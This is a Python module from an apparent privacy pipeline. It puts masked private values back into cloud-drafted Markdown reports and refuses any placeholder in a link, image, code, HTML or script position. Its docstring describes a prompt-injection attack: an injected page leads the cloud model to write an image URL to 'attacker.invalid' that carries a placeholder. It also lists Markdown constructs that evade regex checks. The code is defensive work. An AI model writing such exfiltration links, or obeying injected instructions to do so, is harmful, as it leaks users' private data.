"""Put the private values back, and only where putting them back is safe.

This is scope-doc Fix 2, the finding a security reviewer would build a
rejection around. The harness spec substituted every ⟦SLOT⟧ it found, and
its own attack example shows why that is a data-loss channel: an injected
web page persuades the cloud to write

    ![](https://attacker.invalid/?d=⟦SLOT:PROJECT_a1b2c3d4⟧)

the reintegrator fills in the real value, and the report viewer, which sits
in neither Docker network, fetches the URL. Nothing crossed the partition;
the value was reconstituted on the trusted side and handed to a renderer
outside it. The network invariant is intact and the data still leaves.

What this module enforces
-------------------------
1. **No invented placeholders.** Every slot in the draft must be one the core
   issued and the mapping table can resolve. Anything else means the cloud
   fabricated an entity reference, and the section is refused, not repaired.
2. **No substitution in a transport position.** A slot inside a link or
   image destination, an autolink, a reference-definition URL, inline code,
   a fenced or indented code block, or raw HTML is never filled in. In strict
   mode (the default) its presence refuses the section, because a placeholder
   in a URL is not a formatting accident, it is the attack. In lenient mode
   the token is replaced by "[redacted reference]" and counted.
3. **Remote images are removed** and replaced by their alt text, because an
   image fetch is a request the viewer makes to a host the report chose.
   Inline ones are removed by pattern. A reference-style image (``![label]``
   with a ``[label]: url`` definition elsewhere) is resolved by its label
   *text*, which a substituted value can supply, so the pattern cannot see it
   and the sentinel pass cannot model it; any the renderer still resolves to a
   remote source after substitution is disabled by escaping every image
   opener. Links are kept as text-and-URL; the position rule already keeps
   values out of them, and the renderer's CSP (a deployment matter, stated in
   the paper) is the second layer.

Two checks, and the second is the one that decides
--------------------------------------------------
Position classification over the Markdown *source* is by structural regex,
because the parser library does not expose inline character offsets and
cannot render tokens back to Markdown. A regex approximation of the
CommonMark grammar diverges from it, and every divergence is a value in a
URL. Five were found by reading the grammar for constructs the patterns do
not model, and all five put a real value into rendered markup:

* a link destination containing balanced parentheses, which CommonMark
  permits and `link_dest`'s ``[^\\s)]+`` stops short of;
* a raw HTML tag with ``>`` inside a quoted attribute, which the quoting-blind
  ``html`` pattern ends early;
* a link reference definition with its destination on the next line;
* a link title in parentheses, CommonMark's third title delimiter;
* the *body* of an HTML block — ``<script>`` or ``<style>`` — which is not a
  tag, so no tag pattern covers it. That one exfiltrates with no user
  interaction at all.

So the source-level check is no longer what the guarantee rests on. After
substitution the output is rendered with markdown-it and the rendered HTML
is searched for private values in any attribute that causes a fetch or a
navigation, and in any script or style body. A value found there is put
back, and in strict mode the section is refused. The renderer is the oracle
rather than the regex, so the guarantee is decidable rather than
approximated: whatever the classifier believes, markdown-it decides what
becomes an href.

The source-level pass is kept in front of it because it is cheap, it refuses
before a value is ever spliced in, and it produces the better error message.

Both checks run before R1's sentence pruning, on the draft as the cloud wrote
it (finding F21). Pruning drops a sentence whose every fact reference names an
attribute the store does not hold, so it depends on data the cloud cannot see.
When it ran first, a reference in an image URL refused the section if the
attribute was recorded and vanished with its sentence if not: the refusal
indicator answered "does this attribute exist". Every token is now checked
whether or not it resolves, and a pruning that would itself move a token into
a transport position is not applied (strict mode), so whether the section is
refused, and why, is a function of the draft alone. The prose written is not,
by design: a present attribute is written as its value, an absent one as
"not recorded" or with its sentence pruned. What makes the sentinel verdict
hold for that prose is that neither fill can open structure: values are
escaped, and the absent fill is plain words (it was "[not recorded]", whose
brackets made links and images the sentinel pass never saw).
`backend/tests/security/test_pipeline_exfil.py` pins this through the pipeline,
for four regex-visible cases and the five render-only constructs pinned in the
unit tests, each with a present and an absent attribute, plus the fill cases.

`alt` and `title` are deliberately not treated as transport. Neither fetches
nor navigates; both are shown to the reader, who is handed real values by
design. The threat is a request leaving the viewer, not text the reader can
already see.

The "multiset equality" phrasing in the audit fits template substitution,
not free prose: a section may legitimately mention an entity twice or not at
all. The enforced invariant is set inclusion (returned ⊆ issued) plus
resolvability; omissions are counted and reported, never refused.
"""

from __future__ import annotations

import logging
import re
import string
from collections.abc import Iterable
from dataclasses import dataclass
from html import unescape
from html.parser import HTMLParser
from urllib.parse import unquote

from markdown_it import MarkdownIt

from privdeep.models.facts import ATTRIBUTE_CODES, FACT_RE, NOT_RECORDED, VALUE_KIND, token_union
from privdeep.tier1_local.fact_store import LocalFactStore
from privdeep.tier1_local.slot_masker import SLOT_RE, LocalMappingTable

log = logging.getLogger(__name__)

__all__ = ["ReintegrationRefused", "ReintegrationResult", "SlotReintegrator"]

_REDACTED = "[redacted reference]"

# Attribute polarity is deliberately inverted: everything is transport unless
# it is on this list. An allowlist of fetching attributes has to be complete to
# be correct, and it was not — `srcdoc` alone carries a whole document, and
# `imagesrcset`, `xlink:href` and `manifest` all fetch. Enumerating what is
# safe is a short, closed list; enumerating what fetches is neither, and an
# attribute nobody thought of should fail closed.
_SAFE_ATTRS = frozenset({
    "alt", "title", "class", "id", "lang", "dir", "role",
    "width", "height", "align", "valign", "colspan", "rowspan",
    "start", "reversed", "type", "name", "scope", "headers", "abbr",
    "span", "checked", "disabled", "readonly", "hidden", "tabindex",
})

_RAW_TEXT_ELEMENTS = frozenset({"script", "style"})

# `srcdoc` is an entire nested document, not a URL, so it is read as a body.
_BODY_ATTRS = frozenset({"srcdoc"})

# Characters that can change what an inline span IS. A private value is
# escaped on the way in so it can only ever be text: a company name containing
# "](" would otherwise close the link it sits in and make the rest of the line a
# destination, and a "<" could open raw HTML.
#
# Deliberately narrow. An earlier set also escaped . - + # ! | ~ { }, which
# cannot open a link, image, raw HTML or code span inline under CommonMark, and
# the cost showed up in the first live measurement: "187,432.55" was written as
# "187,432\.55" and every ISO date as "2026\-06\-01". The private report the
# judge read carried 42 such escapes; the oracle report carried none. That is a
# presentation difference between the arms, in front of a judge scoring
# coherence and specificity. It was expected to bias the comparison and was
# then measured: re-judging the same pair with the escapes stripped from both
# moved the private score by -0.12, inside the judge's own run-to-run range
# of 0.125. No bias was detectable at that N. The set is narrowed anyway,
# because a difference in presentation between the arms should not be
# possible by construction, whether or not a given judge happens to notice.
#
# What the narrow set gives up, stated: . - + # at the very start of a line are
# block markers (list, heading), so a value that begins a line with one of them
# can change formatting. That is layout, not a transport position, and the
# rendered-sentinel check below is what decides P5 regardless of escaping.
_MD_ACTIVE = re.compile(r"([\\`*_\[\]()<>])")

# CommonMark's backslash-escapable set. A backslash in the draft directly before
# a placeholder is literal in the sentinel probe (a sentinel starts with a
# letter), but before a fill that starts with one of these it is an escape, and
# the fill's own leading escape is what it escapes: "\" + "\[x" is "\\[x", a
# literal backslash and a live bracket. `_substitute` doubles such a backslash.
_ASCII_PUNCT = frozenset(string.punctuation)

# The absent fill is written unescaped, so it must be inert on its own: no
# character that can open or close structure, and not starting with one a
# preceding backslash could escape. Checked here, where the reason is.
if _MD_ACTIVE.search(NOT_RECORDED) or NOT_RECORDED[:1] in _ASCII_PUNCT:
    raise RuntimeError("NOT_RECORDED must be inert Markdown; see the INS5 note in facts.py")

# Sentinels stand in for values during verification. Uppercase alphanumeric so
# that nothing in the render path can alter them: percent-encoding, HTML entity
# escaping and smart punctuation all leave them untouched, which is what makes
# "did this span land in a fetching position" an exact question rather than a
# substring guess.
_SENTINEL = "PDXSENTINELX{:04d}X"
_SENTINEL_RE = re.compile(r"PDXSENTINELX\d{4}X")

# One renderer, configured as the report viewer would be: CommonMark with raw
# HTML passed through, which is the permissive case. Rendering with html=False
# would hide exactly the constructs this check exists to catch.
_MD = MarkdownIt("commonmark", {"html": True})


class _TransportSink(HTMLParser):
    """Collects every rendered position from which a value would leave the page.

    Two kinds: the values of dereferenced attributes, and the text inside
    `script` and `style`, which the browser executes rather than displays.
    """

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.captured: list[str] = []
        self._raw_depth = 0

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag in _RAW_TEXT_ELEMENTS:
            self._raw_depth += 1
        for name, value in attrs:
            if value and name.lower().strip() not in _SAFE_ATTRS:
                self.captured.append(value)

    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.handle_starttag(tag, attrs)
        if tag in _RAW_TEXT_ELEMENTS:
            self._raw_depth -= 1

    def handle_endtag(self, tag: str) -> None:
        if tag in _RAW_TEXT_ELEMENTS and self._raw_depth > 0:
            self._raw_depth -= 1

    def handle_data(self, data: str) -> None:
        if self._raw_depth > 0:
            # HTMLParser does not decode entities in CDATA mode, and markdown-it
            # escapes & < > when it emits inline raw text, so an unescaped read
            # would miss any value containing one of them.
            self.captured.append(unescape(data))


def _transport_text(markdown: str) -> str:
    """Render, then return every rendered position a value could leave from.

    Decoded three ways, because the renderer re-encodes: HTML entities in
    attribute values (handled by `convert_charrefs`) and in raw-text bodies
    (handled above), and percent-encoding, which markdown-it applies to every
    link destination. A non-ASCII value — which is most of a Vietnamese corpus
    — reaches an `href` as `%E1%BB%85` and is invisible to a raw comparison.
    """
    sink = _TransportSink()
    try:
        sink.feed(_MD.render(markdown))
        sink.close()
    except Exception:  # a malformed render must not silently pass the check
        log.exception("render for transport check failed; treating output as unsafe")
        return markdown
    raw = "\n".join(sink.captured)
    decoded = raw
    for _ in range(3):  # to a fixed point, so double-encoding does not hide
        nxt = unquote(decoded)
        if nxt == decoded:
            break
        decoded = nxt
    return raw + "\n" + decoded

# Transport positions: spans in which a substituted value would become part of
# a URL, code, or markup rather than prose. Order matters only for overlap
# resolution, which is by span union, so it does not.
_UNSAFE_PATTERNS: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("fence", re.compile(r"^(`{3,}|~{3,})[^\n]*\n.*?^\1[ \t]*$", re.M | re.S)),
    ("indented_code", re.compile(r"(?:^(?: {4}|\t)[^\n]*\n?)+", re.M)),
    ("inline_code", re.compile(r"(`+)(?!`)(.+?)(?<!`)\1(?!`)", re.S)),
    ("html", re.compile(r"<[A-Za-z/!?][^>]*>", re.S)),
    # ](dest "title") for links and images; the destination up to the closing paren
    ("link_dest", re.compile(r"\]\(\s*(<[^>]*>|[^\s)]+)(?:\s+(\"[^\"]*\"|'[^']*'))?\s*\)")),
    ("autolink", re.compile(r"<(?:[A-Za-z][A-Za-z0-9+.-]{1,31}:[^\s<>]*|[^\s<>@]+@[^\s<>]+)>")),
    ("ref_def", re.compile(r"^[ \t]{0,3}\[[^\]]+\]:[ \t]*\S+.*$", re.M)),
)

_REMOTE_IMAGE = re.compile(r"!\[([^\]]*)\]\(\s*(?:<)?(?:https?:|//)[^)]*\)", re.I)

# Any scheme, or protocol-relative: wider than _REMOTE_IMAGE on purpose, since
# this one decides from what the renderer resolved rather than from the source.
_REMOTE_SRC = re.compile(r"^\s*(?:[A-Za-z][A-Za-z0-9+.-]*:|//)")


def _rendered_remote_images(markdown: str) -> int:
    """How many Markdown images the renderer resolves to a remote source.

    Counts image tokens, so raw-HTML ``<img>`` is not included: its source is
    literal draft text, not resolved through a label, and a placeholder in it
    is already refused by both position checks. A parse failure counts as one,
    so the caller disables images rather than trusting an unread document.
    """
    try:
        stack = list(_MD.parse(markdown))
    except Exception:
        log.exception("parse for the image check failed; treating output as carrying one")
        return 1
    n = 0
    while stack:
        tok = stack.pop()
        if tok.type == "image" and _REMOTE_SRC.match(str(tok.attrGet("src") or "")):
            n += 1
        stack.extend(tok.children or ())
    return n


@dataclass(frozen=True, slots=True)
class ReintegrationResult:
    text: str
    substituted: int
    unique_slots: tuple[str, ...]
    missing_issued: tuple[str, ...]      # issued for this section, never used
    unsafe_positions: int                # slots found in transport positions
    remote_images_removed: int
    facts_resolved: int = 0              # fact references written with a value
    facts_unavailable: int = 0           # advertised but absent: "not recorded"
    sentences_pruned: int = 0            # dropped: every fact reference was unavailable
    prune_reverted: int = 0              # would have been dropped, but pruning moved a
                                         # placeholder into a transport position (strict)


class ReintegrationRefused(RuntimeError):
    def __init__(self, reason: str, *, invented: tuple[str, ...] = (), unsafe: int = 0) -> None:
        super().__init__(reason)
        self.invented = invented
        self.unsafe = unsafe


class SlotReintegrator:
    def __init__(self, table: LocalMappingTable, *, strict: bool = True,
                 facts: LocalFactStore | None = None) -> None:
        self.table = table
        self.strict = strict
        # R1. Without a store the token set is SLOT_RE alone and behaviour is
        # exactly what it was; a fact-shaped string is then ordinary text.
        # With one, fact references take the same single finditer and therefore
        # the same sentinel render and transport-position checks as slots: no new
        # transport path is written, so none is opened.
        self.facts = facts
        self._token_re = token_union(SLOT_RE, FACT_RE) if facts is not None else SLOT_RE

    def _fact_known(self, token: str, issued: set[str]) -> bool:
        m = FACT_RE.fullmatch(token)
        if m is None or m.group("attr") not in ATTRIBUTE_CODES or self.facts is None:
            return False
        referent = self.facts.referent_for_hex(m.group("hex"))
        return referent is not None and (not issued or referent in issued)

    _SENTENCE_END = re.compile(r"(?<=[.!?])[ \t]+")
    _LIST_MARKER = re.compile(r"^\s*(?:[-*+]|\d+[.)]|>)\s*$")

    def _prune_unrecorded(self, draft: str) -> tuple[str, int]:
        """Drop sentences whose every fact reference is advertised but absent.

        The first live R1 report put "[not recorded]" in 27 of 55 sentences, some
        with no other content: "where [not recorded] trails [not recorded]". The
        cloud cannot know which attributes exist -- that is the padding claim --
        so it cannot be asked to avoid them; the core, which knows, removes the
        sentences that would say nothing. This is local rewriting of cloud prose,
        so it is narrow and counted: a sentence is dropped only if it contains at
        least one fact reference and none of them resolves. Sentences with no
        fact reference, or with any resolved one, are kept. Table rows, headings
        and fenced code are never touched. Nothing is sent back to the cloud.
        """
        assert self.facts is not None
        out_lines: list[str] = []
        pruned = 0
        in_fence = False
        for line in draft.split("\n"):
            stripped = line.lstrip()
            if stripped.startswith("```") or stripped.startswith("~~~"):
                in_fence = not in_fence
                out_lines.append(line)
                continue
            if in_fence or stripped.startswith(("|", "#")):
                out_lines.append(line)
                continue
            kept: list[str] = []
            pos = 0
            pieces = []
            for m in self._SENTENCE_END.finditer(line):
                pieces.append(line[pos:m.end()])
                pos = m.end()
            pieces.append(line[pos:])
            dropped_here = 0
            for piece in pieces:
                refs = list(FACT_RE.finditer(piece))
                if refs and all(self._fact_fill(r.group(0)) is None for r in refs):
                    dropped_here += 1
                    continue
                kept.append(piece)
            pruned += dropped_here
            new_line = "".join(kept).rstrip() if dropped_here else line
            if dropped_here and (not new_line.strip() or self._LIST_MARKER.match(new_line)):
                continue
            out_lines.append(new_line)
        return "\n".join(out_lines), pruned

    def _fact_fill(self, token: str) -> str | None:
        """The value for a known reference, or None if it is advertised but absent."""
        m = FACT_RE.fullmatch(token)
        assert m is not None and self.facts is not None
        fact = self.facts.get(m.group("hex"), m.group("attr"))
        if fact is None:
            return None
        text = fact.rendering()
        if fact.unit and VALUE_KIND[m.group("attr")] in ("money", "quantity"):
            text = f"{text} {fact.unit}"
        return text

    def reintegrate(self, draft: str, issued: Iterable[str] = ()) -> ReintegrationResult:
        issued_set = set(issued)
        found = list(self._token_re.finditer(draft))
        slot_hits = [m for m in found if m.group(0).startswith("⟦SLOT:")]
        fact_hits = [m for m in found if m.group(0).startswith("⟦FACT:")]
        invented = tuple(sorted({m.group(0) for m in slot_hits
                                 if m.group(0) not in self.table
                                 or (issued_set and m.group(0) not in issued_set)}))
        if invented:
            raise ReintegrationRefused(
                f"INVENTED_SLOT: {len(invented)} placeholder(s) not issued for this section",
                invented=invented,
            )
        # Scoped to the session-issued referents, not per section: the pipeline
        # passes every payload slot as `issued`, so a per-section rule would be
        # dead code. An unknown referent or a code outside the vocabulary refuses;
        # a known referent lacking that attribute does not (see _fact_fill).
        invented_facts = tuple(sorted({m.group(0) for m in fact_hits
                                       if not self._fact_known(m.group(0), issued_set)}))
        if invented_facts:
            raise ReintegrationRefused(
                f"INVENTED_FACT: {len(invented_facts)} fact reference(s) name an unknown "
                "referent or an attribute outside the vocabulary",
                invented=invented_facts,
            )

        # Both position checks run on the draft as the cloud wrote it, before
        # pruning (F21). Pruning depends on which attributes the store holds, and
        # the cloud does not know that; the verdict must not depend on it either.
        # With pruning first, a reference inside an image URL refused the section
        # when its attribute was recorded and was silently deleted with its
        # sentence when it was not, so the refusal indicator -- visible to anyone
        # holding the report -- said whether the attribute exists. Here every
        # token is checked whether or not it resolves: the sentinel pass stands a
        # sentinel in for every fact reference, recorded or absent, so the
        # present and absent drafts refuse with the same reason and count.
        unsafe_spans, unsafe_hits, forced = self._position_check(draft, found)

        # Pruning runs after the invented checks, so a sentence carrying an
        # invented reference refuses the section instead of being deleted, and
        # after the position checks above, for the same reason.
        pruned = prune_reverted = 0
        if self.facts is not None:
            candidate, n_pruned = self._prune_unrecorded(draft)
            if n_pruned:
                c_found = list(self._token_re.finditer(candidate))
                c_spans, c_hits, c_forced = self._position_check(candidate, c_found,
                                                                 refuse=False)
                # The existing check, on the text that would be written. Removing
                # a sentence can change how the rest parses -- a backtick in the
                # pruned sentence re-pairs the code spans around it -- and put a
                # token that was in prose into a transport position. Refusing
                # then would reopen the same oracle from the other side: the
                # absent draft refused, the present one written. In strict mode
                # the unpruned draft, which has just passed both checks, is
                # written instead, "not recorded" and all, so whether the
                # section is refused stays a function of the draft alone. The
                # checks model the text written only because NOT_RECORDED is
                # inert, like the sentinel standing in for it: while it was
                # "[not recorded]" this branch wrote links and images the checks
                # never saw (INS5 review). Lenient mode keeps the pruned text
                # and redacts, as before.
                if self.strict and (c_hits or c_forced):
                    log.warning("pruning %d sentence(s) would put a placeholder in a "
                                "transport position; writing the unpruned draft", n_pruned)
                    prune_reverted = n_pruned
                else:
                    draft, found, pruned = candidate, c_found, n_pruned
                    unsafe_spans, unsafe_hits, forced = c_spans, c_hits, c_forced
            fact_hits = [m for m in found if m.group(0).startswith("⟦FACT:")]

        out, substituted, used, n_img, _ = self._substitute(
            draft, found, unsafe_spans, forced, sentinel=False
        )
        # A reference-style image is looked up by its label text, and a fill
        # can be that text: "![⟦FACT⟧]" with "[not recorded]: https://..."
        # elsewhere fetches only when the attribute is absent, and with a
        # guessed value in the definition it confirms a slot's value. The
        # sentinel pass cannot see either, so the rendered output decides:
        # if any image still resolves to a remote source, every image opener
        # is escaped. Local images go with them in that report; that is the
        # price of not parsing labels by regex.
        n_ref_img = _rendered_remote_images(out)
        if n_ref_img:
            log.warning("%d remote image(s) resolved after substitution; disabling images",
                        n_ref_img)
            out = out.replace("![", "!\\[")
            n_img += n_ref_img
        used_t = tuple(used)
        missing = tuple(sorted(issued_set - {s for s in used_t if s.startswith("⟦SLOT:")}))
        n_unsafe = len(unsafe_hits) + len(forced)
        if n_unsafe:
            log.warning("%d slot(s) in transport positions redacted (lenient mode)", n_unsafe)
        live_facts = [m for m in fact_hits if m.group(0) not in forced
                      and not self._inside(m.start(), m.end(), unsafe_spans)]
        unavailable = sum(self._fact_fill(m.group(0)) is None for m in live_facts)
        return ReintegrationResult(
            text=out,
            substituted=substituted,
            unique_slots=tuple(s for s in used_t if s.startswith("⟦SLOT:")),
            missing_issued=missing,
            unsafe_positions=n_unsafe,
            remote_images_removed=n_img,
            facts_resolved=len(live_facts) - unavailable,
            facts_unavailable=unavailable,
            sentences_pruned=pruned,
            prune_reverted=prune_reverted,
        )

    def _position_check(
        self, draft: str, found: list[re.Match[str]], *, refuse: bool | None = None,
    ) -> tuple[list[tuple[int, int]], list[re.Match[str]], set[str]]:
        """Both transport-position checks over one draft.

        Returns the unsafe source spans, the tokens inside them, and the token
        ids whose sentinel rendered into a transport position. With `refuse`
        (default: strict mode) either finding raises instead.
        """
        refuse = self.strict if refuse is None else refuse
        unsafe_spans = self._unsafe_spans(draft)

        unsafe_hits = [m for m in found if self._inside(m.start(), m.end(), unsafe_spans)]
        if unsafe_hits and refuse:
            raise ReintegrationRefused(
                f"SLOT_IN_TRANSPORT_POSITION: {len(unsafe_hits)} placeholder(s) inside a "
                "URL, code, or HTML span; refusing to substitute",
                unsafe=len(unsafe_hits),
            )

        # Substitute a unique sentinel per slot, render, and see which
        # sentinels landed in a fetching position. Asking about the sentinel
        # rather than about the value is what makes this exact: it answers
        # "did the span I substituted land there", not "does this string occur
        # there". The difference is two real defects — a value the cloud itself
        # wrote into a legitimate URL used to refuse the section, and a value
        # the renderer percent-encoded or entity-escaped used to be missed.
        # A fact reference gets a sentinel whether or not it resolves, so the
        # answer does not depend on the store.
        #
        # Redacting one sentinel can change how the rest of the document
        # parses, so the pass repeats; each round fixes at least one slot, so
        # it terminates.
        forced: set[str] = set()
        for _ in range(len(found) + 1):
            probe, _sub, _used, _img, sentinels = self._substitute(
                draft, found, unsafe_spans, forced, sentinel=True
            )
            transport = _transport_text(probe)
            landed = {sid for sid, tok in sentinels.items() if tok in transport}
            if not landed - forced:
                break
            forced |= landed

        if forced and refuse:
            raise ReintegrationRefused(
                f"RENDERED_TRANSPORT_POSITION: {len(forced)} placeholder(s) render into a "
                "URL, script or style position that the source-level check did not model; "
                "refusing to substitute",
                unsafe=len(forced),
            )
        return unsafe_spans, unsafe_hits, forced

    def _substitute(
        self,
        draft: str,
        found: list[re.Match[str]],
        unsafe_spans: list[tuple[int, int]],
        forced: set[str],
        *,
        sentinel: bool,
    ) -> tuple[str, int, list[str], int, dict[str, str]]:
        """One substitution pass. `forced` slot ids are redacted wherever they appear.

        With `sentinel=True` each slot is replaced by a unique inert token for
        the position check; with `sentinel=False` by the real value, escaped so
        it cannot restructure the document it lands in.
        """
        order: dict[str, str] = {}
        for m in found:
            sid = m.group(0)
            if sid not in order:
                order[sid] = _SENTINEL.format(len(order))

        out = draft
        substituted = 0
        used: list[str] = []
        # Right-to-left so earlier offsets stay valid.
        for m in reversed(found):
            sid = m.group(0)
            if sid in forced or self._inside(m.start(), m.end(), unsafe_spans):
                out = out[: m.start()] + _REDACTED + out[m.end():]
                continue
            if sentinel:
                fill = order[sid]
            elif sid.startswith("⟦FACT:"):
                value = self._fact_fill(sid)
                fill = NOT_RECORDED if value is None else _MD_ACTIVE.sub(r"\\\1", value)
            else:
                fill = _MD_ACTIVE.sub(r"\\\1", self.table.original(sid))
            if not sentinel and fill[:1] in _ASCII_PUNCT:
                # Offsets left of m are still the draft's (right-to-left pass).
                run = len(out[: m.start()]) - len(out[: m.start()].rstrip("\\"))
                if run % 2:
                    fill = "\\" + fill
            out = out[: m.start()] + fill + out[m.end():]
            substituted += 1
            if sid not in used:
                used.append(sid)
        out, n_img = self._strip_remote_images(out)
        live = {sid: tok for sid, tok in order.items() if sid in used}
        return out, substituted, list(reversed(used)), n_img, live

    # ------------------------------------------------------------------ helpers

    @staticmethod
    def _unsafe_spans(text: str) -> list[tuple[int, int]]:
        spans: list[tuple[int, int]] = []
        for _name, pat in _UNSAFE_PATTERNS:
            spans.extend(m.span() for m in pat.finditer(text))
        spans.sort()
        merged: list[tuple[int, int]] = []
        for s, e in spans:
            if merged and s <= merged[-1][1]:
                merged[-1] = (merged[-1][0], max(merged[-1][1], e))
            else:
                merged.append((s, e))
        return merged

    @staticmethod
    def _inside(start: int, end: int, spans: list[tuple[int, int]]) -> bool:
        return any(s <= start and end <= e for s, e in spans)

    @staticmethod
    def _strip_remote_images(text: str) -> tuple[str, int]:
        n = 0

        def repl(m: re.Match[str]) -> str:
            nonlocal n
            n += 1
            alt = m.group(1).strip()
            return f"[image removed{': ' + alt if alt else ''}]"

        return _REMOTE_IMAGE.sub(repl, text), n
